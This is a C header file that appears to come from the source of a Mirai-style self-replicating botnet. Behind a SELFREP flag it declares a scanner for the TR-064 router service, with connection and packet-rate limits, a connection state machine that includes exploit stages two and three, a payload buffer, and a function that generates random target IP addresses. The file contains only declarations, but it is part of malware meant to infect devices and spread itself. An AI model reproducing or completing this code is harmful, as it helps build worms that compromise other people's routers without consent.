#ifdef SELFREP

#pragma once

#include <stdint.h>

#include "includes.h"

#define tr064_SCANNER_MAX_CONNS 318
#define tr064_SCANNER_RAW_PPS 720

#define tr064_SCANNER_RDBUF_SIZE 830
#define tr064_SCANNER_HACK_DRAIN 64

struct tr064_scanner_connection
{
    int fd, last_recv;
    enum
    {
        tr064_SC_CLOSED,
        tr064_SC_CONNECTING,
        tr064_SC_EXPLOIT_STAGE2,
        tr064_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[tr064_SCANNER_RDBUF_SIZE];
    char payload_buf[1024];
};

void tr064_scanner_init();
void tr064_scanner_kill(void);

static void tr064_setup_connection(struct tr064_scanner_connection *);
static ipv4_t tr064_get_random_ip(void);

#endif
